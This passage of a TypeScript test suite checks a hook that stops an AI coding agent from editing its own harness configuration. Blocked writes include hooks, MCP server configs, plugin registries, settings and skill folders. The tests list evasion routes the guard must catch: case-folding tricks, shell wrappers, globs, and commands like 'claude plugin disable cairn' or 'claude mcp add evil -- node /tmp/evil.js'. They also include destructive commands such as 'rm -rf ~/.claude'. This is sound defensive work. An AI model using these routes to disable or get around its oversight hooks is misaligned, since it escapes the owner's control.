    for (const file of [".cursor/rules/style.mdc", ".cursor/mcp.json.bak", "docs/.cursor-notes.md"]) {
      expect(runHookRaw(HARNESSGUARD, p, filePayload(join(p, file))).status, file).toBe(0);
    }
    for (const c of ["cat .cursor/hooks.json", "mkdir -p .cursor/rules", "echo x > .cursor/rules/a.mdc"]) {
      expect(runHookRaw(HARNESSGUARD, p, bashPayload(c)).status, c).toBe(0);
    }
  });
});

// #295: on a Mac's case-insensitive volume `.Claude/settings.json` IS
// `.claude/settings.json` -- same file, same inode -- and `TEE` runs tee.
// Every protected path now matches in any letter case: read in its on-disk
// case when it exists, compared case-folded when it doesn't (so the tests
// hold on a case-sensitive volume too). Each variant is paired with its
// exact spelling, through Write, Edit and a Bash redirect.
describe("harness guard matches protected paths in any letter case (#295)", () => {
  // `@cairn` is the cairn home folder, spelled apart for the commit leak guard (see #263 above).
  const sh = (s: string) => s.replaceAll("@cairn", ".cairn");
  const write = (file: string, tool = "Write") =>
    JSON.stringify({ tool_name: tool, tool_input: { file_path: sh(file) }, cwd: "" });
  const bash = (command: string) =>
    JSON.stringify({ tool_name: "Bash", tool_input: { command: sh(command) }, cwd: "" });

  /** Exit status and stderr, with no inherited override, CDPATH or cairn home. */
  function run(p: string, payload: string, env: Record<string, string> = {}) {
    const e: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, ...env };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CAIRN_HOME", "CLAUDE_PLUGIN_ROOT"]) if (!(k in env)) delete e[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env: e, input: payload, encoding: "utf8", timeout: 5000,
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  /** The same folder with its last name upper-cased -- a case variant of a temp dir. */
  const shout = (dir: string) => join(dirname(dir), basename(dir).toUpperCase());

  // [exact, its case variants, the phrase the refusal names] -- the long s
  // and the Kelvin sign are letters APFS folds onto s and k.
  const SURFACES: Array<[string, string[], string]> = [
    ["hooks/hooks.json", ["HOOKS/hooks.json", "Hooks/Hooks.JSON", "hooKs/hooks.json"], "hook directory"],
    [".mcp.json", [".MCP.json", ".Mcp.Json"], "MCP server config"],
    [".claude/settings.json", [".Claude/settings.json", ".claude/SETTINGS.json", ".claude/ſettings.json"],
      "settings file"],
    [".claude/settings.local.json", [".CLAUDE/Settings.Local.json"], "settings file"],
    [".claude-plugin/plugin.json", [".Claude-Plugin/plugin.json", ".claude-plugin/PLUGIN.JSON"], "plugin manifest"],
    [".claude/hooks/x.sh", [".claude/HOOKS/x.sh", ".Claude/Hooks/x.sh"], "Claude hooks"],
    [".claude/agents/a.md", [".Claude/Agents/a.md"], "agent definitions"],
    [".cursor/hooks.json", [".Cursor/hooks.json", ".cursor/HOOKS.json"], "Cursor's hooks"],
    [".cursor/hooks/cairn/a.mjs", [".CURSOR/Hooks/cairn/a.mjs"], "Cursor's hooks"],
  ];

  for (const onDisk of [true, false]) {
    it(`a case variant of a project surface is refused like its exact spelling (${onDisk ? "on disk" : "not there yet"})`, () => {
      const p = freshDir("cairn-hooks-case-");
      if (onDisk) {
        for (const [file] of SURFACES) {
          mkdirSync(dirname(join(p, file)), { recursive: true });
          writeFileSync(join(p, file), "{}");
        }
      }
      for (const [exact, variants, phrase] of SURFACES) {
        for (const file of [exact, ...variants]) {
          for (const tool of ["Write", "Edit"]) {
            const r = run(p, write(join(p, file), tool));
            expect(r.status, `${tool} ${file}`).toBe(2);
            expect(r.stderr, `${tool} ${file}`).toContain(phrase);
          }
          expect(run(p, bash(`echo {} > ${file}`)).status, `redirect ${file}`).toBe(2);
        }
      }
    });
  }

  it("protected folders, wildcards, find and cd match in any case; reads of the same paths pass", () => {
    const p = freshDir("cairn-hooks-case-");
    mkdirSync(join(p, "hooks"), { recursive: true });
    writeFileSync(join(p, "hooks", "hooks.json"), "{}");
    mkdirSync(join(p, ".claude", "agents"), { recursive: true });
    writeFileSync(join(p, ".claude", "settings.json"), "{}");
    const pairs: Array<[exact: string, variant: string, read: string]> = [
      ["rm -rf hooks", "rm -rf HOOKS", "ls HOOKS"],
      ["rm -rf .claude", "rm -rf .CLAUDE", "ls -la .CLAUDE"],
      ["mv /tmp/cfg .claude", "mv /tmp/cfg .Claude", "stat .Claude"],
      ["cp evil.json .claude/", "cp evil.json .CLAUDE/", "cp .CLAUDE/settings.json /tmp/copy.json"],
      ["rm -rf .claude/agents", "rm -rf .Claude/Agents", "ls .Claude/Agents"],
      ["rm -rf .cursor", "rm -rf .Cursor", "ls .Cursor"],
      ["sed -i '' 's/a/b/' .claude/*.json", "sed -i '' 's/a/b/' .CLAUDE/*.json", "grep -n a .CLAUDE/*.json"],
      ["cp -r payload/* hooks/", "cp -r payload/* Hooks/", "cat Hooks/hooks.json"],
      ["rm h*/hooks.json", "rm H*/HOOKS.JSON", "cat H*/hooks.json"],
      ["find hooks -delete", "find HOOKS -delete", "find HOOKS -name '*.json'"],
      ["find . -name hooks.json -delete", "find . -name 'HOOKS.JSON' -delete", "find . -name 'HOOKS.JSON'"],
      ["cd hooks && echo x > a", "cd HOOKS && echo x > a", "cd HOOKS && cat hooks.json"],
      ["git checkout -- hooks/hooks.json", "git checkout -- HOOKS/hooks.json", "git diff -- HOOKS/hooks.json"],
    ];
    for (const [exact, variant, read] of pairs) {
      expect(run(p, bash(exact)).status, exact).toBe(2);
      expect(run(p, bash(variant)).status, variant).toBe(2);
      expect(run(p, bash(read)).status, read).toBe(0);
    }
  });

  it("a command's name in any case is the same command: TEE runs tee on a Mac", () => {
    const p = freshDir("cairn-hooks-case-");
    for (const [exact, variant] of [
      ["tee hooks/hooks.json", "TEE hooks/hooks.json"],
      ["rm -rf hooks", "/BIN/RM -rf hooks"],
      ["cp /tmp/x .claude/settings.json", "Cp /tmp/x .claude/settings.json"],
      ["sed -i '' 's/a/b/' .mcp.json", "SED -i '' 's/a/b/' .mcp.json"],
      ["find hooks -delete", "FIND hooks -delete"],
      ["bash -c 'echo x > hooks/a'", "BASH -c 'echo x > hooks/a'"],
      ["cat fix.diff | patch -p1", "CAT fix.diff | PATCH -p1"],
    ]) {
      if (exact.includes("fix.diff")) {
        writeFileSync(join(p, "fix.diff"), "--- a/hooks/hooks.json\n+++ b/hooks/hooks.json\n@@ -1 +1 @@\n-{}\n+{\"x\":1}\n");
      }
      expect(run(p, bash(exact)).status, exact).toBe(2);
      expect(run(p, bash(variant)).status, variant).toBe(2);
    }
    for (const c of ["CAT hooks/hooks.json", "GREP -n x .mcp.json", "TEE /tmp/out.txt < hooks/hooks.json"]) {
      expect(run(p, bash(c)).status, c).toBe(0);
    }
  });

  it("look-alikes in any case stay ordinary work", () => {
    const p = freshDir("cairn-hooks-case-");
    for (const file of ["docs/HOOKS.md", "Hooksy/a.json", "server/Hooks/helper.ts", "SETTINGS.json",
      "my.MCP.json", ".Claude/Skillset/x/SKILL.md", ".Cursor/rules/a.mdc", ".claude/SETTINGS.md"]) {
      expect(run(p, write(join(p, file))).status, file).toBe(0);
    }
  });

  it("outside the project: machine-wide settings, the registry, the cairn home and the plugin root, any case", () => {
    const p = freshDir("cairn-hooks-case-proj-");
    const home = freshDir("cairn-hooks-case-home-");
    const cairnHome = freshDir("cairn-hooks-case-cairnhome-");
    const root = freshDir("cairn-hooks-case-pluginroot-");
    mkdirSync(join(home, ".claude", "plugins"), { recursive: true });
    writeFileSync(join(home, ".claude", "settings.json"), "{}");
    writeFileSync(join(home, ".claude", "plugins", "installed_plugins.json"), "{}");
    for (const base of [join(home, ".cairn"), cairnHome]) {
      mkdirSync(join(base, "ship-gate"), { recursive: true });
      mkdirSync(join(base, "runs"), { recursive: true });
      writeFileSync(join(base, "ship-gate", "x.json"), "{}");
      writeFileSync(join(base, "runs", "r1.json"), "{}");
    }
    mkdirSync(join(root, "hooks"), { recursive: true });
    writeFileSync(join(root, "hooks", "hooks.json"), "{}");
    const env = { HOME: home, CAIRN_HOME: cairnHome, CLAUDE_PLUGIN_ROOT: root };
    const cases: Array<[string, string[], string]> = [
      [join(home, ".claude", "settings.json"),
        [join(home, ".CLAUDE", "settings.json"), join(home, ".claude", "Settings.Local.json")], "machine-wide"],
      ["~/.claude/plugins/installed_plugins.json",
        ["~/.Claude/Plugins/installed_plugins.json", "~/.claude/PLUGINS/new.json"], "installed plugins"],
      ["~/@cairn/ship-gate/x.json", ["~/.CAIRN/ship-gate/x.json", "~/@cairn/Ship-Gate/y.json"], "ship-gate stamp"],
      ["~/@cairn/runs/r1.json", ["~/@cairn/RUNS/r1.JSON", "~/.Cairn/runs/R1.json"], "run manifests"],
      [join(cairnHome, "ship-gate", "x.json"), [join(shout(cairnHome), "SHIP-GATE", "x.json")], "ship-gate stamp"],
      [join(root, "hooks", "hooks.json"), [join(shout(root), "HOOKS", "hooks.json")], "installed plugin"],
    ];
    for (const [exact, variants, phrase] of cases) {
      for (const file of [exact, ...variants]) {
        for (const tool of ["Write", "Edit"]) {
          const r = run(p, write(file, tool), env);
          expect(r.status, `${tool} ${file}`).toBe(2);
          expect(r.stderr, `${tool} ${file}`).toContain(phrase);
        }
        expect(run(p, bash(`echo {} > ${file}`), env).status, `redirect ${file}`).toBe(2);
      }
    }
    for (const c of ["rm -rf ~/.CLAUDE", "rm -rf ~/.CAIRN", "mv ~/.Cairn ~/old", `rm -rf ${shout(root)}`,
      "rm -rf ~/.claude/PLUGINS", "find ~/.CAIRN -name '*.json' -delete"]) {
      expect(run(p, bash(c), env).status, c).toBe(2);
    }
    // the run report and the rest of the cairn home stay writable in any case; reads pass
    for (const file of ["~/.CAIRN/runs/r1-report.md", "~/.Cairn/handoff/x.json"]) {
      expect(run(p, write(file), env).status, file).toBe(0);
    }
    for (const c of ["cat ~/.CLAUDE/settings.json", "ls ~/.CAIRN/ship-gate", "echo x > ~/.CAIRN/runs/r1-report.md"]) {
      expect(run(p, bash(c), env).status, c).toBe(0);
    }
  });
});

// #298: .mcp.json was the only MCP server config protected, but Claude
// Code also starts the servers in ~/.claude.json (user and local scope,
// with no project trust prompt), and Cursor reads .cursor/mcp.json (which
// cairn-setup writes) and ~/.cursor/mcp.json. A server entry is a command
// the harness runs with the user's credentials, so all three are refused
// like .mcp.json; reading them stays frictionless.
describe("harness guard protects the other MCP server configs (#298)", () => {
  const write = (file: string, tool = "Write") =>
    JSON.stringify({ tool_name: tool, tool_input: { file_path: file }, cwd: "" });
  const bash = (command: string) =>
    JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: "" });

  /** A project and a home holding each config, as cairn-setup and the harnesses leave them. */
  function fixture() {
    const p = freshDir("cairn-hooks-mcp-proj-");
    const home = freshDir("cairn-hooks-mcp-home-");
    mkdirSync(join(p, ".cursor"), { recursive: true });
    mkdirSync(join(home, ".cursor"), { recursive: true });
    for (const f of [join(p, ".cursor", "mcp.json"), join(home, ".claude.json"), join(home, ".cursor", "mcp.json")]) {
      writeFileSync(f, JSON.stringify({ mcpServers: {} }));
    }
    return { p, home, env: { HOME: home } };
  }

  it("refuses Write and Edit on each config, in any letter case, naming it", () => {
    const { p, home, env } = fixture();
    const cases: Array<[string, string]> = [
      [join(home, ".claude.json"), "your machine-wide MCP server config"],
      ["~/.claude.json", "your machine-wide MCP server config"],
      [join(home, ".CLAUDE.json"), "your machine-wide MCP server config"],
      [join(p, ".cursor", "mcp.json"), "Cursor's MCP server config"],
      [join(p, ".Cursor", "MCP.json"), "Cursor's MCP server config"],
      [join(p, "packages", "web", ".cursor", "mcp.json"), "Cursor's MCP server config"],
      [join(home, ".cursor", "mcp.json"), "your machine-wide Cursor MCP server config"],
      ["~/.CURSOR/mcp.json", "your machine-wide Cursor MCP server config"],
    ];
    for (const [file, phrase] of cases) {
      for (const tool of ["Write", "Edit"]) {
        const r = runHookRaw(HARNESSGUARD, p, write(file, tool), env);
        expect(r.status, `${tool} ${file}`).toBe(2);
        expect(r.stderr, `${tool} ${file}`).toContain(phrase);
      }
    }
  });

  it("refuses the shell writes an agent would use, and passes their reads", () => {
    const { p, env } = fixture();
    const pairs: Array<[write: string, read: string]> = [
      ["echo '{}' > ~/.claude.json", "cat ~/.claude.json"],
      ["jq '.mcpServers.x={}' ~/.claude.json > /tmp/c.json && mv /tmp/c.json ~/.claude.json",
        "jq '.mcpServers' ~/.claude.json > /tmp/servers.json"],
      ["sed -i '' 's/a/b/' $HOME/.claude.json", "grep -n mcpServers $HOME/.claude.json"],
      ["cp /tmp/evil.json ~/.claude.json", "cp ~/.claude.json /tmp/claude-backup.json"],
      ["sed -i '' 's/a/b/' .cursor/mcp.json", "cat .cursor/mcp.json"],
      ["tee .cursor/mcp.json < /tmp/evil.json", "tee /tmp/copy.json < .cursor/mcp.json"],
      ["echo '{}' > ~/.cursor/mcp.json", "cat ~/.cursor/mcp.json"],
      ["cd ~/.cursor && echo '{}' > mcp.json", "cd ~/.cursor && cat mcp.json"],
      ["rm ~/.claude.json", "ls -la ~/.claude.json"],
      ["rm -rf ~/.cursor", "ls ~/.cursor"],
      ["mv /tmp/cfg ~/.cursor", "stat ~/.cursor"],
    ];
    for (const [w, read] of pairs) {
      expect(runHookRaw(HARNESSGUARD, p, bash(w), env).status, w).toBe(2);
      expect(runHookRaw(HARNESSGUARD, p, bash(read), env).status, read).toBe(0);
    }
  });

  it("a wildcard or a folder's contents that can land on one is refused", () => {
    const { p, env } = fixture();
    for (const c of [
      "echo '{}' > ~/.c*.json",
      "rm ~/.claude*",
      "cp -r /tmp/cfg/. ~",
      "rsync -a /tmp/cfg/ ~/",
      "sed -i '' 's/a/b/' ~/.cursor/*.json",
      "sed -i '' 's/a/b/' .cursor/*.json",
      "find ~ -maxdepth 1 -name '.claude.json' -delete",
    ]) {
      expect(runHookRaw(HARNESSGUARD, p, bash(c), env).status, c).toBe(2);
    }
  });

  it("their neighbours stay ordinary work", () => {
    const { p, home, env } = fixture();
    for (const file of [join(home, ".claude.json.bak"), join(home, ".cursor", "argv.json"),
      join(p, ".cursor", "rules", "a.mdc"), join(p, "mcp.json"), join(p, "docs", "claude.json")]) {
      expect(runHookRaw(HARNESSGUARD, p, write(file), env).status, file).toBe(0);
    }
    for (const c of ["echo x > ~/.cursor/argv.json", "mkdir -p .cursor/rules", "cat ~/.claude.json | jq ."]) {
      expect(runHookRaw(HARNESSGUARD, p, bash(c), env).status, c).toBe(0);
    }
  });
});

// #303: `claude mcp add` and its kin write ~/.claude.json (local scope, the
// default, and user scope) or .mcp.json (project scope) from a process of
// their own, which the guard didn't model -- so a server registered that way
// started next session outside every hook. Each writing form is refused now,
// with the owner-approval wording and no override prefix; list, get and
// serve still pass, and each refused form sits next to one of them.
describe("harness guard refuses Claude Code's MCP server command (#303)", () => {
  /** A project and a home holding ~/.claude.json, the way Claude Code leaves them. */
  function fixture() {
    const p = freshDir("cairn-hooks-claudemcp-proj-");
    const home = freshDir("cairn-hooks-claudemcp-home-");
    writeFileSync(join(home, ".claude.json"), JSON.stringify({ mcpServers: {} }));
    return { p, home };
  }

  /** Exit status and stderr for one Bash command, with no inherited override, CDPATH or plugin root. */
  function run(p: string, home: string, command: string) {
    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env, encoding: "utf8", timeout: 5000,
      input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: "" }),
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  it("every writing subcommand is refused in every scope, next to a read that passes", () => {
    const { p, home } = fixture();
    const pairs: Array<[write: string, read: string]> = [
      ["claude mcp add evil -- node /tmp/evil.js", "claude mcp list"],
      ["claude mcp add -s local evil -- node /tmp/evil.js", "claude mcp get evil"],
      ["claude mcp add --scope user evil -- node /tmp/evil.js", "claude mcp get cairn"],
      ["claude mcp add --scope=user --transport http evil https://example.com/mcp", "claude mcp list"],
      ["claude mcp add -s project evil -- node /tmp/evil.js", "claude mcp get evil"],
      ["claude mcp add-json evil '{\"command\":\"node\",\"args\":[\"/tmp/evil.js\"]}'", "claude mcp get evil"],
      ["claude mcp add-json -s user evil '{\"command\":\"node\"}'", "claude mcp list"],
      ["claude mcp add-from-claude-desktop", "claude mcp serve"],
      ["claude mcp add-from-claude-desktop -suser", "claude mcp serve --debug"],
      ["claude mcp remove cairn", "claude mcp get cairn"],
      ["claude mcp remove -s user cairn", "claude mcp get cairn"],
      ["claude mcp remove --scope project cairn", "claude mcp list"],
      ["claude mcp reset-project-choices", "claude mcp list"],
    ];
    for (const [write, read] of pairs) {
      const r = run(p, home, write);
      expect(r.status, write).toBe(2);
      expect(r.stderr, write).toContain("MCP server config");
      expect(r.stderr, write).toContain("owner's go-ahead");
      expect(r.stderr, write).not.toContain("CAIRN_HARNESS_EDIT=1");
      expect(run(p, home, read).status, read).toBe(0);
    }
  });

  it("names the file each scope writes: ~/.claude.json for local and user, .mcp.json for project", () => {
    const { p, home } = fixture();
    for (const c of ["claude mcp add evil -- node x", "claude mcp add -s local evil -- node x",
      "claude mcp add -s user evil -- node x", "claude mcp remove cairn"]) {
      const r = run(p, home, c);
      expect(r.stderr, c).toContain("your machine-wide MCP server config");
      expect(r.stderr, c).toContain(join(home, ".claude.json"));
    }
    for (const c of ["claude mcp add -s project evil -- node x", "claude mcp remove -s project cairn"]) {
      const r = run(p, home, c);
      expect(r.stderr, c).toContain("this would change the MCP server config");
      expect(r.stderr, c).toContain(".mcp.json");
    }
    // a `-s project` after `--` belongs to the server's own command line
    expect(run(p, home, "claude mcp add evil -- node x -s project").stderr).toContain("machine-wide");
  });

  it("the command is seen in any letter case, through wrappers, nested shells, options and streams", () => {
    const { p, home } = fixture();
    const pairs: Array<[write: string, read: string]> = [
      ["CLAUDE mcp add evil -- node x", "CLAUDE mcp list"],
      ["/opt/homebrew/bin/Claude mcp remove cairn", "/opt/homebrew/bin/Claude mcp get cairn"],
      ["sudo -u root claude mcp add -s user evil -- node x", "sudo -u root claude mcp list"],
      ["env FOO=1 claude mcp add evil -- node x", "env FOO=1 claude mcp list"],
      ["bash -c 'claude mcp add evil -- node x'", "bash -c 'claude mcp list'"],
      ["claude --model opus mcp add evil -- node x", "claude --model opus mcp list"],
      ["claude mcp --model opus add evil -- node x", "claude mcp --model opus get cairn"],
      ["claude mcp {add,} evil -- node x", "claude mcp {list,}"],
      ["echo evil | xargs -I{} claude mcp add {} -- node x", "echo evil | xargs -I{} echo claude mcp add {}"],
      ["echo 'mcp add evil node x' | xargs claude", "echo 'mcp add evil node x' | xargs echo claude"],
      ["find . -name x -exec claude mcp add {} -- node x \\;", "find . -name x -exec cat {} \\;"],
      ["cd src && claude mcp add -s project evil -- node x", "cd src && claude mcp list"],
    ];
    for (const [write, read] of pairs) {
      expect(run(p, home, write).status, write).toBe(2);
      expect(run(p, home, read).status, read).toBe(0);
    }
  });

  it("a prompt that only mentions the command, and reading the config, pass", () => {
    const { p, home } = fixture();
    for (const c of [
      "claude -p 'explain claude mcp add'",
      "claude -p \"why does mcp remove need a scope\"",
      "claude --version",
      "claude mcp --help",
      "claude mcp list > /tmp/servers.txt",
      "claude mcp get cairn | grep command",
      "cat ~/.claude.json | jq .mcpServers",
    ]) {
      expect(run(p, home, c).status, c).toBe(0);
    }
  });
});

// #308: #303 covered `claude mcp`, but its siblings write the same harness
// config from a process of their own: `claude plugin disable cairn` turns
// off every cairn guard next session, install/enable/uninstall/update/prune
// and the marketplace commands change which plugins load, init scaffolds an
// auto-loading plugin in ~/.claude/skills, and `claude import` brings in
// another agent's config. Each is refused with the owner-approval wording;
// list, details, validate, a dry run and help pass next to them.
describe("harness guard refuses Claude Code's plugin and import commands (#308)", () => {
  /** A project and a home with Claude Code's config in place. */
  function fixture() {
    const p = freshDir("cairn-hooks-claudeplugin-proj-");
    const home = freshDir("cairn-hooks-claudeplugin-home-");
    mkdirSync(join(home, ".claude", "plugins"), { recursive: true });
    writeFileSync(join(home, ".claude", "settings.json"), "{}");
    writeFileSync(join(home, ".claude.json"), "{}");
    return { p, home };
  }

  /** Exit status and stderr for one Bash command, with no inherited override, CDPATH or plugin root. */
  function run(p: string, home: string, command: string) {
    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env, encoding: "utf8", timeout: 5000,
      input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: "" }),
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  it("every plugin, marketplace and import command that writes is refused, next to one that only reads", () => {
    const { p, home } = fixture();
    const pairs: Array<[write: string, read: string]> = [
      ["claude plugin disable cairn@cairn-dev", "claude plugin list"],
      ["claude plugin disable --all", "claude plugin list --json"],
      ["claude plugin disable -a -s project", "claude plugin details cairn"],
      ["claude plugin enable evil@market", "claude plugin details evil@market"],
      ["claude plugin install evil@market", "claude plugin list"],
      ["claude plugin install evil -s project", "claude plugin validate ."],
      ["claude plugin i evil", "claude plugin list"],
      ["claude plugins install evil", "claude plugins list"],
      ["claude plugin uninstall cairn", "claude plugin details cairn"],
      ["claude plugin remove cairn --keep-data", "claude plugin list"],
      ["claude plugin update cairn", "claude plugin list"],
      ["claude plugin prune -y", "claude plugin prune --dry-run"],
      ["claude plugin autoremove -y", "claude plugin autoremove --dry-run"],
      ["claude plugin init helper --with hooks mcp", "claude plugin init --help"],
      ["claude plugin new helper", "claude plugin help new"],
      ["claude plugin configure cairn --values-stdin", "claude plugin configure cairn"],
      ["claude plugin marketplace add evil/repo", "claude plugin marketplace list"],
      ["claude plugin marketplace add evil/repo --scope project", "claude plugin marketplace add -h"],
      ["claude plugin marketplace remove cairn-dev", "claude plugin marketplace list"],
      ["claude plugin marketplace rm cairn-dev", "claude plugin marketplace --help"],
      ["claude plugin marketplace update", "claude plugin marketplace list"],
      ["claude import cursor --yes=abc123", "claude import cursor --dry-run"],
      ["claude import", "claude import --help"],
    ];
    for (const [write, read] of pairs) {
      const r = run(p, home, write);
      expect(r.status, write).toBe(2);
      expect(r.stderr, write).toContain("owner's go-ahead");
      expect(r.stderr, write).not.toContain("CAIRN_HARNESS_EDIT=1");
      expect(run(p, home, read).status, read).toBe(0);
    }
  });

  it("names what each one changes: the plugin registry, the settings its scope names, a new skills-dir plugin", () => {
    const { p, home } = fixture();
    const rows: Array<[command: string, what: string, file: string]> = [
      ["claude plugin install evil", "the installed plugins and their registry", "installed_plugins.json"],
      ["claude plugin marketplace add evil/repo", "the installed plugins and their registry", "known_marketplaces.json"],
      ["claude plugin disable cairn -s user", "your machine-wide Claude settings", join(home, ".claude", "settings.json")],
      ["claude plugin disable cairn", "your machine-wide Claude settings", join(home, ".claude", "settings.json")],
      ["claude plugin disable cairn --scope project", "a settings file", join(".claude", "settings.json")],
      ["claude plugin enable evil -s local", "a settings file", join(".claude", "settings.local.json")],
      ["claude plugin init helper", "your machine-wide skills", join(home, ".claude", "skills")],
      ["claude import cursor --yes", "your machine-wide Claude settings", join(home, ".claude", "settings.json")],
    ];
    for (const [command, what, file] of rows) {
      const r = run(p, home, command);
      expect(r.stderr, command).toContain(`this would change ${what}`);
      expect(r.stderr, command).toContain(file);
    }
  });

  it("help counts only right after the subcommand words, ending them, where no option can have swallowed it", () => {
    const { p, home } = fixture();
    for (const c of ["claude --help", "claude plugin -h", "claude plugin install --help", "claude mcp add --help",
      "claude plugin help install"]) {
      expect(run(p, home, c).status, c).toBe(0);
    }
    // anywhere else the flag may be a value an option swallowed (`--description -h`
    // scaffolds a plugin described "-h") or a word for a server's command line
    for (const c of ["claude plugin init helper --description -h", "claude plugin install evil --help",
      "claude mcp add evil --help -- node x", "claude plugin prune -s --dry-run", "claude plugin --help disable cairn"]) {
      expect(run(p, home, c).status, c).toBe(2);
    }
  });

  it("a plugin named like a subcommand can't hide the write beside it", () => {
    const { p, home } = fixture();
    expect(run(p, home, "claude plugin disable cairn marketplace").status).toBe(2);
    expect(run(p, home, "claude plugin details marketplace").status).toBe(0);
  });

  it("the commands are seen in any letter case, through wrappers, nested shells and streams", () => {
    const { p, home } = fixture();
    const pairs: Array<[write: string, read: string]> = [
      ["CLAUDE plugin disable cairn", "CLAUDE plugin list"],
      ["/opt/homebrew/bin/Claude Plugin Disable cairn", "/opt/homebrew/bin/Claude Plugin List"],
      ["sudo -u root claude plugin install evil", "sudo -u root claude plugin list"],
      ["caffeinate -i claude import cursor --yes", "caffeinate -i claude import cursor --dry-run"],
      ["bash -c 'claude plugin disable cairn'", "bash -c 'claude plugin list'"],
      ["claude --model opus plugin disable cairn", "claude --model opus plugin list"],
      ["echo cairn | xargs claude plugin disable", "echo cairn | xargs echo claude plugin disable"],
    ];
    for (const [write, read] of pairs) {
      expect(run(p, home, write).status, write).toBe(2);
      expect(run(p, home, read).status, read).toBe(0);
    }
  });
});

// #309: ~/.claude/skills, ~/.claude/agents, ~/.claude/commands and the
// project's .claude/skills and .claude/commands were unprotected, so a
// folder planted in ~/.claude/skills with a plugin manifest loaded next
// session as a plugin with its own hooks and MCP servers -- the escalation
// the guard refuses for ~/.claude/plugins. Each folder is refused for every
// write shape now, in any letter case; reading them stays ordinary work.
describe("harness guard protects skill, agent and command folders (#309)", () => {
  /** A project and a home holding each folder, the way Claude Code leaves them. */
  function fixture() {
    const p = freshDir("cairn-hooks-skills-proj-");
    const home = freshDir("cairn-hooks-skills-home-");
    for (const d of [join(home, ".claude", "skills", "helper"), join(home, ".claude", "agents"),
      join(home, ".claude", "commands"), join(p, ".claude", "skills", "x"), join(p, ".claude", "commands")]) {
      mkdirSync(d, { recursive: true });
    }
    writeFileSync(join(home, ".claude", "skills", "helper", "SKILL.md"), "# helper\n");
    writeFileSync(join(p, ".claude", "skills", "x", "SKILL.md"), "# x\n");
    writeFileSync(join(p, ".claude", "commands", "x.md"), "x\n");
    return { p, home };
  }

  /** Exit status and stderr for one tool call, with no inherited override, CDPATH or plugin root. */
  function run(p: string, home: string, tool: string, input: Record<string, string>) {
    const env: Record<string, string | undefined> = { ...process.env, CLAUDE_PROJECT_DIR: p, HOME: home };
    for (const k of ["CAIRN_HARNESS_EDIT", "CDPATH", "CLAUDE_PLUGIN_ROOT"]) delete env[k];
    const r = spawnSync(process.execPath, [HARNESSGUARD], {
      cwd: p, env, encoding: "utf8", timeout: 5000,
      input: JSON.stringify({ tool_name: tool, tool_input: input, cwd: "" }),
    });
    return { status: r.status, stderr: r.stderr ?? "" };
  }

  it("refuses Write and Edit into each folder, in any letter case, naming it", () => {
    const { p, home } = fixture();
    const cases: Array<[string, string]> = [
      [join(home, ".claude", "skills", "helper", ".claude-plugin", "plugin.json"), "your machine-wide skills"],
      [join(home, ".claude", "skills", "helper", "hooks", "hooks.json"), "your machine-wide skills"],
      ["~/.claude/skills/helper/.mcp.json", "your machine-wide skills"],
      [join(home, ".CLAUDE", "Skills", "helper", "SKILL.md"), "your machine-wide skills"],
      [join(home, ".claude", "agents", "x.md"), "your machine-wide agent definitions"],
      ["~/.claude/AGENTS/x.md", "your machine-wide agent definitions"],
      [join(home, ".claude", "commands", "x.md"), "your machine-wide slash commands"],
      [join(p, ".claude", "skills", "x", "SKILL.md"), "the project's skills"],
      [join(p, ".Claude", "SKILLS", "y", "SKILL.md"), "the project's skills"],
      [join(p, "packages", "web", ".claude", "skills", "x", "SKILL.md"), "the project's skills"],
      [join(p, ".claude", "commands", "x.md"), "the project's slash commands"],
      [join(p, ".claude", "Commands", "deploy.md"), "the project's slash commands"],
    ];
    for (const [file, phrase] of cases) {
      for (const tool of ["Write", "Edit"]) {
        const r = run(p, home, tool, { file_path: file });
        expect(r.status, `${tool} ${file}`).toBe(2);
        expect(r.stderr, `${tool} ${file}`).toContain(phrase);
        expect(r.stderr, `${tool} ${file}`).toContain("owner's go-ahead");
      }
    }
  });

  it("refuses the shell writes an agent would use, and passes their reads", () => {
    const { p, home } = fixture();
    const pairs: Array<[write: string, read: string]> = [
      ["echo '{}' > ~/.claude/skills/helper/.claude-plugin/plugin.json", "cat ~/.claude/skills/helper/SKILL.md"],
      ["mkdir -p ~/.claude/skills/helper/hooks", "ls ~/.claude/skills"],
      ["cp -r /tmp/plugin ~/.claude/skills/helper", "cp -r ~/.claude/skills/helper /tmp/backup"],
      ["tee ~/.claude/agents/x.md < /tmp/a.md", "tee /tmp/a.md < ~/.claude/agents/x.md"],
      ["echo x > $HOME/.claude/commands/x.md", "grep -r x $HOME/.claude/commands"],
      ["rm -rf ~/.claude/skills", "ls -la ~/.claude/skills"],
      ["mv /tmp/evil ~/.claude/agents", "stat ~/.claude/agents"],
      ["rm -rf ~/.claude/s*", "ls -d ~/.claude/s*"],
      ["find ~/.claude/skills -name '*.md' -delete", "find ~/.claude/skills -name '*.md'"],
      ["echo x > .claude/skills/x/SKILL.md", "cat .claude/skills/x/SKILL.md"],
      ["cp /tmp/c.md .claude/commands/", "cp .claude/commands/x.md /tmp/c.md"],
      ["rm -rf .claude/skills", "ls .claude/skills"],
      ["sed -i '' 's/a/b/' .claude/commands/*.md", "grep -n a .claude/commands/*.md"],
      ["cd .claude/skills && echo x > x/SKILL.md", "cd .claude/skills && cat x/SKILL.md"],
    ];
    for (const [w, read] of pairs) {
      expect(run(p, home, "Bash", { command: w }).status, w).toBe(2);
      expect(run(p, home, "Bash", { command: read }).status, read).toBe(0);
    }
  });

  it("their neighbours stay ordinary work: the plugin's own skills/ and commands/, other ~/.claude folders", () => {
    const { p, home } = fixture();
